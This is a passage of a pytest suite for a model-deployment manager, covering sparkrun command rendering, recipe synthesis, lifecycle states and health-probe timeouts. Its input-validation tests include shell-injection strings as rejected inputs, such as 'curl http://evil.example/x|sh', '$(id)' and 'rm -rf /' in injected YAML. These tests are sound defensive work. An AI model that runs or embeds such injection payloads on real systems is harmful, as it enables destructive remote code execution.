"""Agent F: deployment manager, sparkrun adapter, lifecycle, Docker.

Organised against the acceptance list in agents/F-deploy.md. Tests that shell
out to a real sparkrun or a real docker are marked and skip when those are
absent; everything else runs anywhere.
"""

from __future__ import annotations

import pathlib

import dataclasses

import asyncio
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from control_plane.contracts import (  # noqa: E402
    Deployment,
    DeploymentPort,
    DeploymentState as S,
    Modality,
    NodeState,
    ParallelismKind,
    ParallelismPlan,
)
from control_plane.deploy import (  # noqa: E402
    DeploymentManager,
    DeploymentStore,
    DuplicateDeployment,
    EventBus,
    IllegalTransition,
    LaunchError,
    LaunchRefused,
    SparkrunAdapter,
    SparkrunNotInstalled,
    StubDeploymentManager,
    backend_origin,
)
from control_plane.deploy import events as ev  # noqa: E402
from control_plane.deploy import recipes  # noqa: E402
from control_plane.deploy.flags import KNOBS_BY_NAME  # noqa: E402
from control_plane.deploy.fsm import LEGAL, SERVING, TERMINAL  # noqa: E402
from control_plane.deploy.recipes import materialize, synthesize  # noqa: E402
from control_plane.deploy.sparkrun import default_served_name, is_oom  # noqa: E402
from tests import fixtures as fx  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
HAVE_SPARKRUN = shutil.which("sparkrun") is not None
HAVE_DOCKER = shutil.which("docker") is not None

needs_sparkrun = pytest.mark.skipif(not HAVE_SPARKRUN, reason="sparkrun not installed")
needs_docker = pytest.mark.skipif(not HAVE_DOCKER, reason="docker not installed")


# --------------------------------------------------------------------------
# Fakes. Small enough to read; the point is that no test needs a real cluster.
# --------------------------------------------------------------------------


class FakeRegistry:
    """RegistryPort over a mutable dict of NodeState."""

    def __init__(self, *profiles):
        self._nodes = {p.node_id: fx.node_state(p) for p in profiles}

    def list_nodes(self) -> list[NodeState]:
        return list(self._nodes.values())

    def get_node(self, node_id: str) -> NodeState | None:
        return self._nodes.get(node_id)

    def healthy_nodes(self) -> list[NodeState]:
        return [n for n in self._nodes.values() if n.healthy]

    def set_memory_pct(self, node_id: str, pct: float) -> None:
        """*pct* of `addressable_memory` -- M-13: that is the denominator the
        manager's pressure watch now shares with the gateway's admission
        controller, not the nameplate `total_memory` (they disagree on GB10:
        addressable 119.7 GiB < total 128 GiB). Setting against total here
        would silently test a different fraction than the manager computes.
        """
        node = self._nodes[node_id]
        node.memory_used = int(node.profile.addressable_memory * pct / 100.0)

    def set_healthy(self, node_id: str, healthy: bool) -> None:
        self._nodes[node_id].healthy = healthy


class FakeAdapter(SparkrunAdapter):
    """SparkrunAdapter with the subprocess calls replaced.

    Subclassed rather than mocked so render_command, recipe synthesis and host
    resolution are the real code under test; only the four methods that shell
    out are swapped.
    """

    def __init__(self, *args, **kwargs):
        self.fail_with: LaunchError | None = kwargs.pop("fail_with", None)
        super().__init__(*args, **kwargs)
        self.running: set[str] = set()
        self.launches: list[list[str]] = []
        self.stops: list[str] = []
        self.log_tail = ""
        self.stop_confirms = True
        self._counter = 0
        # M-16: cluster ids whose check-job a wedged host cannot answer.
        # is_running() must read this as unknown (None), not as False.
        self.unknown: set[str] = set()

    def available(self) -> bool:
        return True

    def launch(self, plan, shape, runtime, ctx, max_seqs, *, served_name=None, port=None):
        if self.fail_with is not None:
            raise self.fail_with
        self._counter += 1
        cluster_id = "sparkrun_%012x" % self._counter
        argv = self.render_command(
            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port
        )
        self.launches.append(argv)
        self.running.add(cluster_id)
        hosts = self.hosts_for(plan.node_ids)
        chosen = port if port is not None else self.base_port
        from control_plane.deploy.sparkrun import LaunchResult

        return LaunchResult(
            cluster_id=cluster_id,
            head_host=hosts[0],
            backend_url="http://%s:%d/v1" % (hosts[0], chosen),
            port=chosen,
            hosts=hosts,
            recipe_path=Path(self.recipe_dir) / "fake.yaml",
            argv=argv,
            raw="Cluster:   %s\n" % cluster_id,
        )

    def check_job(self, cluster_id, *, hosts=None, timeout=60.0):
        if cluster_id in self.unknown:
            return {"running": None, "cluster_id": cluster_id, "error": "check-job timed out"}
        return {"running": cluster_id in self.running, "cluster_id": cluster_id}

    def stop(self, cluster_id, *, hosts=None):
        self.stops.append(cluster_id)
        if self.stop_confirms:
            self.running.discard(cluster_id)
            return True, "stopped"
        return False, "stop failed"

    def logs(self, cluster_id, *, hosts=None, tail=200, timeout=30.0):
        return self.log_tail


class FakeProbe:
    """Health probe whose answer is a dict the test controls."""

    def __init__(self, healthy_by_default: bool = True):
        self.healthy_by_default = healthy_by_default
        self.overrides: dict[str, bool] = {}
        self.calls = 0

    def __call__(self, backend_url: str, timeout: float = 3.0):
        self.calls += 1
        healthy = self.overrides.get(backend_url, self.healthy_by_default)
        return (True, None) if healthy else (False, "%s unreachable" % backend_url)

    def kill(self, backend_url: str) -> None:
        self.overrides[backend_url] = False


def make_manager(tmp_path, *, registry=None, probe=None, **kwargs) -> DeploymentManager:
    registry = registry or FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    return DeploymentManager(
        adapter,
        registry,
        state_dir=tmp_path,
        probe_fn=probe or FakeProbe(),
        autostart=False,
        ready_poll_interval_s=0.01,
        ready_timeout_s=5.0,
        stop_confirm_timeout_s=1.0,
        **kwargs,
    )


def wait_for(predicate, timeout: float = 5.0, interval: float = 0.01) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return predicate()


def drain(bus: EventBus, event_type: str) -> list[dict]:
    return [e for e in bus.recent() if e["type"] == event_type]


# ==========================================================================
# Acceptance: a WONT_FIT verdict never produces a launch attempt, and the
# returned error is Agent D's reason verbatim.
# ==========================================================================


def test_wont_fit_never_launches_and_the_reason_is_verbatim(tmp_path):
    manager = make_manager(tmp_path)
    fit = fx.wont_fit()

    with pytest.raises(LaunchRefused) as excinfo:
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)

    assert str(excinfo.value) == fit.reason
    assert excinfo.value.reason == fit.reason
    assert excinfo.value.fit is fit
    assert manager.adapter.launches == []
    assert manager.list() == []
    # Not even a recipe file was written.
    assert not (tmp_path / "recipes").exists()

    refusals = drain(manager.bus, ev.LAUNCH_REFUSED)
    assert len(refusals) == 1
    assert refusals[0]["reason"] == fit.reason


def test_wont_fit_reason_is_not_paraphrased_by_the_stub_either():
    stub = StubDeploymentManager()
    fit = fx.wont_fit()
    with pytest.raises(LaunchRefused) as excinfo:
        stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)
    assert str(excinfo.value) == fit.reason
    assert stub.list() == []
    stub.close()


def test_fits_degraded_still_launches(tmp_path):
    """FITS_DEGRADED means slow, not refused. Only WONT_FIT blocks."""
    manager = make_manager(tmp_path)
    deployment = manager.launch(
        fx.LLAMA_3_3_70B, fx.pp2_plan(), fx.fits_degraded(), "vllm", 8192, 16
    )
    assert deployment.state is S.LAUNCHING
    manager.close()


# ==========================================================================
# Acceptance: render_command produces the correct sparkrun invocation for
# pipeline parallel across two hosts, verified against real sparkrun flags.
# ==========================================================================


def test_render_command_pipeline_parallel_across_two_hosts(tmp_path):
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    argv = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[0] == "sparkrun"
    assert argv[1] == "run"
    assert argv[2].endswith(".yaml")

    def value_after(flag: str) -> str:
        return argv[argv.index(flag) + 1]

    # node_ids resolved to the addresses sparkrun connects to, head first.
    assert value_after("--hosts") == "%s,%s" % (fx.SPARK_01.address, fx.SPARK_02.address)
    assert value_after("--tp") == "1"
    assert value_after("--pp") == "2"
    assert value_after("--max-model-len") == "65536"
    assert value_after("--served-model-name") == "gpt-oss-120b"
    assert value_after("--port") == "8100"
    assert value_after("--gpu-mem") == "0.90"
    # There is no --max-num-seqs flag in sparkrun; concurrency rides -o.
    assert "-o" in argv and "max_num_seqs=512" in argv
    assert "--max-num-seqs" not in argv
    # Detached, so the launcher returns instead of streaming logs forever.
    assert argv[-1] == "--no-follow"


def test_render_command_is_pure(tmp_path):
    """No subprocess, no filesystem, same answer every time."""
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    first = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    second = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert first == second
    assert not (tmp_path / "recipes").exists()
    assert adapter.launches == []


def test_render_command_sglang_uses_its_own_concurrency_key(tmp_path):
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01), recipe_dir=tmp_path / "recipes")
    argv = adapter.render_command(fx.single_node_plan(), fx.QWEN3_30B_A3B, "sglang", 32768, 128)
    assert "max_running_requests=128" in argv
    assert "max_num_seqs=128" not in argv


def test_render_command_omits_default_parallelism_overrides(tmp_path):
    """EP=1 and DP=1 are not sent: sparkrun hashes non-default parallelism
    into the cluster_id, so sending an explicit 1 would change the handle."""
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "r")
    argv = adapter.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert not any(a.startswith("expert_parallel=") for a in argv)
    assert not any(a.startswith("data_parallel=") for a in argv)


def test_render_command_sends_expert_parallel_when_planned(tmp_path):
    plan = ParallelismPlan(
        kind=ParallelismKind.EXPERT,
        tensor_parallel=1,
        pipeline_parallel=1,
        expert_parallel=2,
        data_parallel=1,
        node_ids=["spark-01", "spark-02"],
        reason="Expert parallel across 2 nodes.",
        measured_link_gbps=48.0,
        rejected=[],
    )
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "r")
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 32768, 256)
    assert "expert_parallel=2" in argv
    recipe = adapter.recipe_for(plan, fx.GPT_OSS_120B, "vllm", 32768, 256)
    assert "--enable-expert-parallel" in recipe.content


def test_unknown_node_id_falls_back_to_the_id_itself(tmp_path):
    """Node ids are hostnames in practice. An unknown one is used verbatim
    rather than blocking a launch on a registry that has not caught up."""
    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01), recipe_dir=tmp_path / "r")
    assert adapter.hosts_for(["spark-01", "spark-99"]) == [fx.SPARK_01.address, "spark-99"]


def test_flag_table_is_the_only_place_flags_are_spelled():
    """Guard against flags creeping back into the code as string literals."""
    source = (REPO / "control_plane" / "deploy" / "sparkrun.py").read_text()
    for knob in KNOBS_BY_NAME.values():
        if knob.cli_flag:
            assert knob.cli_flag not in source, (
                "%s is hardcoded in sparkrun.py; it belongs in flags.py" % knob.cli_flag
            )


# ==========================================================================
# The synthesized recipe. The reason it exists: a stock recipe silently drops
# overrides its command template does not mention.
# ==========================================================================


def test_synthesized_recipe_templates_every_knob_we_override(tmp_path):
    recipe = synthesize(
        fx.GPT_OSS_120B,
        fx.pp2_plan(),
        "vllm",
        65536,
        512,
        "gpt-oss-120b",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path,
    )
    body = recipe.content
    # Every CLI flag we send writes one of these recipe keys. If the command
    # template does not reference the key, sparkrun accepts the flag, exits
    # zero, and the value never reaches the runtime.
    for key in (
        "tensor_parallel",
        "pipeline_parallel",
        "max_model_len",
        "max_num_seqs",
        "port",
        "served_model_name",
        "gpu_memory_utilization",
    ):
        assert "{%s}" % key in body, "recipe command drops %s" % key
        assert "\n  %s:" % key in body, "recipe defaults omit %s" % key
    assert "model: openai/gpt-oss-120b" in body
    assert "runtime: vllm" in body
    assert "min_nodes: 2" in body


def test_synthesized_recipe_is_deterministic(tmp_path):
    args = (fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b")
    kwargs = dict(port=8100, gpu_memory_utilization=0.90, recipe_dir=tmp_path)
    a = synthesize(*args, **kwargs)
    b = synthesize(*args, **kwargs)
    assert a.path == b.path and a.content == b.content
    c = synthesize(*args, **{**kwargs, "port": 8101})
    assert c.path != a.path


def test_materialize_is_atomic_and_idempotent(tmp_path):
    recipe = synthesize(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), "sglang", 32768, 128, "qwen3",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path / "recipes",
    )
    first = materialize(recipe)
    second = materialize(recipe)
    assert first == second
    assert first.read_text() == recipe.content
    assert list(first.parent.glob("*.tmp")) == []


# ==========================================================================
# Acceptance: recipe content is not a place an attacker-controlled string
# gets to write YAML structure. M-22.
# ==========================================================================


def test_a_newline_in_model_id_is_rejected_not_injected(tmp_path):
    """A newline-bearing model_id must not reach the recipe file at all --
    it could otherwise open a new top-level key, including command:, in a
    file sparkrun executes."""
    import dataclasses

    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b\ncommand: |\n  rm -rf /",
    )
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    # synthesize is pure -- it never got the chance to hand a RecipeSpec to
    # materialize, so nothing was ever written for this launch to run.
    assert list(tmp_path.glob("*.yaml")) == []


def test_a_newline_in_served_name_is_rejected_not_injected(tmp_path):
    with pytest.raises(ValueError, match="served_name"):
        synthesize(
            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512,
            "gpt-oss-120b\ncommand: |\n  curl evil.example | sh",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


def test_shell_metacharacters_are_rejected_even_though_the_yaml_is_valid(tmp_path):
    """The other half of M-22. sparkrun injects the recipe's model: into the
    substitution namespace (core/recipe.py, base.setdefault("model", ...)),
    substitutes it into {model}, and the executor runs the rendered command
    under bash -c in a container its own defaults make privileged with host
    networking. This payload carries no newline, no control character, and a
    harmless leading letter -- so every YAML check passes and it would have
    executed."""
    import dataclasses

    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
    )
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


@pytest.mark.parametrize(
    "field,value",
    [
        ("model_id", "org/name;id"),
        ("model_id", "org/name$(id)"),
        ("model_id", "org/name`id`"),
        ("model_id", "org/name&&touch /tmp/pwned"),
        ("model_id", "org/name|sh"),
        ("model_id", "org/name {model}"),  # would re-expand: substitution is a fixpoint loop
        ("served_name", "name;curl evil.example|sh"),
        ("served_name", "name with spaces"),
    ],
)
def test_command_unsafe_strings_are_rejected(tmp_path, field, value):
    import dataclasses

    shape = fx.GPT_OSS_120B
    served = "gpt-oss-120b"
    if field == "model_id":
        shape = dataclasses.replace(shape, model_id=value)
    else:
        served = value
    with pytest.raises(ValueError, match=field):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, served,
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


@pytest.mark.parametrize(
    "model_id",
    [
        "openai/gpt-oss-120b",
        "meta-llama/Llama-3.3-70B-Instruct",
        "deepseek-ai/DeepSeek-V3",
        "org.name/model_v1.0-instruct",
        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant tag colon
        "Qwen/Qwen3-30B-A3B",
    ],
)
def test_real_model_ids_still_synthesize(tmp_path, model_id):
    """The command grammar is an allowlist, so it has to be checked against
    real ids or it silently becomes a denial of service on valid input."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "field,value",
    [
        ("model_id", "org/name\r\ncommand: evil"),  # bare CR
        ("model_id", "org/name\x00hidden"),  # NUL, a control character
        ("model_id", "- looks-like-a-sequence-item"),  # leading dangerous token
        ("model_id", "#not-a-comment-but-could-be-read-as-one"),
        ("model_id", ""),  # empty
        ("served_name", "\tindented-with-a-control-char"),
    ],
)
def test_yaml_unsafe_strings_are_rejected(tmp_path, field, value):
    import dataclasses

    shape = fx.GPT_OSS_120B
    served_name = "gpt-oss-120b"
    if field == "model_id":
        shape = dataclasses.replace(shape, model_id=value)
    else:
        served_name = value
    with pytest.raises(ValueError):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, served_name,
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )


@pytest.mark.parametrize(
    "model_id",
    [
        "meta-llama/Llama-3.3-70B-Instruct",
        "openai/gpt-oss-120b",
        "deepseek-ai/DeepSeek-V3",
        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant-tag colon
        "org.name/model_v1.0-instruct",  # dots and underscores
    ],
)
def test_legitimate_hf_ids_are_not_rejected(tmp_path, model_id):
    """Slashes, dots, dashes, underscores, and a non-leading colon are all
    real HuggingFace-id syntax and must keep working."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "model_id",
    [
        "/data/models/Llama-3.3-70B-Instruct",  # local dir, resolver.py:177
        "~/models/llama",  # home-relative, as resolver.py:75 would expand it
        "/data/models/local.gguf",  # local .gguf file, resolver.py:82-90
        "./relative/model-dir",  # a relative local dir is legal Path syntax too
    ],
)
def test_local_path_model_ids_still_synthesize(tmp_path, model_id):
    """M-22 regression: resolver.py resolves a local directory or a local
    .gguf file by handing its path straight through as ModelShape.model_id
    (see resolver.py's docstring: "a model id, a local directory, or a local
    .gguf file"), including an absolute path. An earlier version of the
    command-safety allowlist anchored the first character to alnum, which
    rejected every one of these -- a real, previously-supported capability,
    not a hypothetical one (test_resolver.py exercises the local-.gguf path
    with an absolute tmp_path). None of these characters are outside what
    the grammar already allowed elsewhere in the string; only the leading
    position was too strict.
    """
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    recipe = synthesize(
        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
    )
    assert "model: %s\n" % model_id in recipe.content


@pytest.mark.parametrize(
    "model_id",
    [
        "/data/models/x;curl http://evil.example|sh",
        "/data/models/x$(id)",
        "/data/models/x && touch /tmp/pwned",
        "~/models/x`id`",
    ],
)
def test_path_shaped_command_unsafe_strings_are_still_rejected(tmp_path, model_id):
    """The other direction of the M-22 local-path fix: widening the leading
    character class to admit '/', '.', and '~' must not smuggle a shell
    metacharacter in behind a harmless-looking path prefix. Every one of
    these starts with a character the grammar now allows to lead, and would
    still reach the command template as {model} if not rejected."""
    import dataclasses

    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
    with pytest.raises(ValueError, match="model_id"):
        synthesize(
            shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
        )
    assert list(tmp_path.glob("*.yaml")) == []


# ==========================================================================
# Acceptance: M-22's identifier check gates DeploymentManager.launch()
# synchronously -- before any record or worker thread exists -- not only
# synthesize() on the async launch worker's thread.
# ==========================================================================


def test_launch_refuses_a_hostile_model_id_before_creating_any_record(tmp_path):
    import dataclasses

    manager = make_manager(tmp_path)
    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
    )
    with pytest.raises(ValueError, match="model_id"):
        manager.launch(hostile, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    # Refused synchronously: no LAUNCHING record was ever created for the
    # async launch worker to later flip to FAILED.
    assert manager.list() == []
    manager.close()


def test_launch_refuses_a_hostile_served_name_before_creating_any_record(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(ValueError, match="served_name"):
        manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
            served_name="name\ncommand: |\n  rm -rf /",
        )
    assert manager.list() == []
    manager.close()


def test_launch_accepts_a_local_path_model_id(tmp_path):
    """The other direction, through the same synchronous gate: a local-path
    model_id (see test_local_path_model_ids_still_synthesize) must still be
    launchable, not just still synthesizable."""
    import dataclasses

    manager = make_manager(tmp_path)
    local = dataclasses.replace(fx.GPT_OSS_120B, model_id=str(tmp_path / "local-model"))
    deployment = manager.launch(local, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    manager.close()


# ==========================================================================
# Acceptance: an illegal state transition raises rather than silently
# correcting.
# ==========================================================================


def test_illegal_transition_raises(tmp_path):
    manager = make_manager(tmp_path)
    probe = manager._probe
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.stop(deployment.deployment_id)
    assert manager.get(deployment.deployment_id).state is S.STOPPED

    record = manager._records[deployment.deployment_id]
    with pytest.raises(IllegalTransition) as excinfo:
        manager._transition(record, S.READY)
    assert "stopped -> ready" in str(excinfo.value)
    # And it did not quietly change anyway.
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    manager.close()


def test_fsm_matches_the_architecture_diagram():
    assert LEGAL[S.PLANNED] == frozenset({S.LAUNCHING})
    assert LEGAL[S.LAUNCHING] == frozenset({S.READY, S.FAILED})
    assert LEGAL[S.READY] == frozenset({S.DEGRADED, S.FAILED, S.STOPPING})
    assert LEGAL[S.DEGRADED] == frozenset({S.READY, S.FAILED, S.STOPPING})
    assert LEGAL[S.STOPPING] == frozenset({S.STOPPED})
    assert LEGAL[S.FAILED] == frozenset()
    assert LEGAL[S.STOPPED] == frozenset()
    assert SERVING == frozenset({S.READY, S.DEGRADED})
    assert TERMINAL == frozenset({S.FAILED, S.STOPPED})


def test_every_state_is_reachable_from_planned():
    seen, frontier = {S.PLANNED}, [S.PLANNED]
    while frontier:
        for nxt in LEGAL[frontier.pop()]:
            if nxt not in seen:
                seen.add(nxt)
                frontier.append(nxt)
    assert seen == set(S)


# ==========================================================================
# Acceptance: a deployment reaching READY exposes a backend URL that answers
# /health.
# ==========================================================================


def test_ready_exposes_a_backend_url_that_answers_health(tmp_path):
    probe = FakeProbe()
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)

    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    live = manager.get(deployment.deployment_id)
    assert live.backend_url == "http://%s:8100/v1" % fx.SPARK_01.address
    assert live.started_at is not None
    assert probe(live.backend_url)[0] is True
    manager.close()


def test_backend_origin_strips_the_v1_suffix():
    assert backend_origin("http://h:8100/v1") == "http://h:8100"
    assert backend_origin("http://h:8100/") == "http://h:8100"
    assert backend_origin("http://h:8100") == "http://h:8100"


def test_health_probe_hits_the_origin_not_the_v1_base(tmp_path):
    """vLLM and SGLang both serve /health at the origin, not under /v1."""
    import http.server
    import threading as _t

    seen: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            seen.append(self.path)
            self.send_response(200 if self.path == "/health" else 404)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *a):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    _t.Thread(target=server.serve_forever, daemon=True).start()
    try:
        from control_plane.deploy.health import probe as real_probe

        url = "http://127.0.0.1:%d/v1" % server.server_port
        healthy, reason = real_probe(url, timeout=2.0)
        assert healthy is True and reason is None
        assert seen == ["/health"]
    finally:
        server.shutdown()


# ==========================================================================
# Acceptance: killing a backend moves the deployment to FAILED within 15
# seconds with a useful last_error.
# ==========================================================================


def test_killing_a_backend_fails_the_deployment_with_a_useful_error(tmp_path):
    probe = FakeProbe()
    manager = make_manager(tmp_path, probe=probe, poll_interval_s=0.01)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.adapter.log_tail = "ERROR ... torch.OutOfMemoryError: CUDA out of memory."
    probe.kill(deployment.backend_url)

    # Two consecutive misses is the threshold; at the real 5s poll that is
    # inside the 15 second bar.
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    manager.tick()

    live = manager.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stopped answering" in live.last_error
    assert live.backend_url in live.last_error

    lost = drain(manager.bus, ev.BACKEND_LOST)
    assert lost and lost[0]["deployment_id"] == deployment.deployment_id
    manager.close()


def test_death_within_the_fifteen_second_bar():
    """At the shipped poll interval, threshold misses land inside 15s.

    This is necessary but not sufficient: it assumes an instant probe. See
    test_hanging_health_endpoint_still_fails_within_fifteen_seconds below for
    the M-15 case this arithmetic alone does not cover.
    """
    from control_plane.deploy.manager import HEALTH_FAIL_THRESHOLD, POLL_INTERVAL_S

    assert POLL_INTERVAL_S * HEALTH_FAIL_THRESHOLD <= 15.0


def _start_hanging_server():
    """A real listening socket that accepts a TCP connection and then never
    writes a response, so a client using the real health.probe() genuinely
    blocks until *its own* timeout expires -- deliberately not a fake that
    resolves instantly, or a test built on it would not distinguish the fix
    from the bug. Returns (hang_port, stop_event, acceptor_thread); the
    caller must set() the event and join() the thread when done.
    """
    import socket as _socket
    import threading as _t

    server = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(64)
    hang_port = server.getsockname()[1]
    stop_accepting = _t.Event()

    def accept_and_hang():
        while not stop_accepting.is_set():
            server.settimeout(0.1)
            try:
                conn, _ = server.accept()
            except OSError:
                continue
            conn.settimeout(60.0)  # hold it open; never write a response

    acceptor = _t.Thread(target=accept_and_hang, daemon=True)
    acceptor.start()
    return hang_port, stop_accepting, acceptor, server


def test_hanging_health_endpoint_still_fails_within_fifteen_seconds(tmp_path):
    """M-15: a HANGING health endpoint (not a fast refusal) costs up to
    ~6s per probe at the default per-path timeout -- two consecutive misses
    would then run ~22s worst case, blowing the 15s acceptance bar even
    though test_death_within_the_fifteen_second_bar's arithmetic looks fine.
    The manager must derive a tighter per-path probe timeout from the poll
    cycle so the wall-clock bound holds even when every probe hangs.

    The clock starts *before* the leading poll interval the real watch loop
    always pays first -- _watch_loop ticks, then waits poll_interval_s, then
    ticks again, so the true worst case (from the instant a healthy backend
    goes silent) is poll_interval_s + probe_time, twice, not just the second
    half of that. Starting the clock only at the first tick call understates
    the real bound by one full poll_interval_s.
    """
    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
    from control_plane.deploy.health import probe as real_probe

    hanging = {"on": False}

    def probe_fn(backend_url, timeout=3.0):
        if not hanging["on"]:
            return True, None
        # Real socket connect + read against the hanging server above,
        # bounded only by *timeout* -- exercises the same code path
        # health.probe() uses, with the manager's derived timeout forwarded.
        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)

    try:
        manager = make_manager(tmp_path, probe=probe_fn)
        deployment = manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
        )
        assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

        hanging["on"] = True
        start = time.monotonic()
        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
        manager.tick()
        assert manager.get(deployment.deployment_id).state is S.READY  # one miss so far
        time.sleep(manager.poll_interval_s)
        manager.tick()
        elapsed = time.monotonic() - start

        live = manager.get(deployment.deployment_id)
        assert live.state is S.FAILED, live.last_error
        assert elapsed <= 15.0, "hanging probe blew the 15s death bound: %.1fs" % elapsed
        manager.close()
    finally:
        stop_accepting.set()
        acceptor.join(timeout=2.0)
        server.close()


def test_hanging_health_endpoints_still_fail_within_fifteen_seconds_at_scale(tmp_path):
    """M-15, the compounding half the single-deployment test above cannot
    exercise: an earlier fix derived the per-path timeout as
    budget_per_tick / watched_count / len(HEALTH_PATHS), floored by
    MIN_PROBE_TIMEOUT_S. Past watched_count = budget_per_tick /
    MIN_PROBE_TIMEOUT_S (6, at the shipped constants) the floor won and the
    *serial* total across all watched deployments grew unboundedly with
    watched_count instead of staying flat -- 16s at 6 deployments, 30s at
    20, worse than the ~22s the original bug produced. tick() must probe
    every deployment's backend concurrently so the wall-clock cost of a tick
    stays roughly constant as watched_count grows past that point. Eight
    deployments, all hanging on the same real socket at once, is comfortably
    past the n=6 threshold where the old arithmetic broke.
    """
    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
    from control_plane.deploy.health import probe as real_probe

    hanging = {"on": False}

    def probe_fn(backend_url, timeout=3.0):
        if not hanging["on"]:
            return True, None
        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)

    try:
        manager = make_manager(tmp_path, probe=probe_fn)
        deployments = [
            manager.launch(
